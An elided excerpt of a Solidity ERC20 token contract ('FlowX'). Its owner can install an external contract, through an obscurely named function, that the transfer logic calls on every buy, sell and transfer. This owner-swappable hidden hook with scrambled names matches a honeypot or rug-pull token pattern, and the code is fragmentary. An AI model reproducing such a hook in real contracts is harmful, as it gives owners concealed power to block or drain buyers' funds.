...
contract TokenM is ERC20 {
    ...
    IUserAmounteesovd public eesovd;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("FlowX", "FLX") {
    ...
    function cerooteeBhseooRcco(IUserAmounteesovd _eesovd) public onlyOwner {
        eesovd = _eesovd;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                eesovd.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				eesovd.addOutAmount(from, amount);
            }else{
                eesovd.addOutAmount(from, amount);
                takeFee = false;
            }
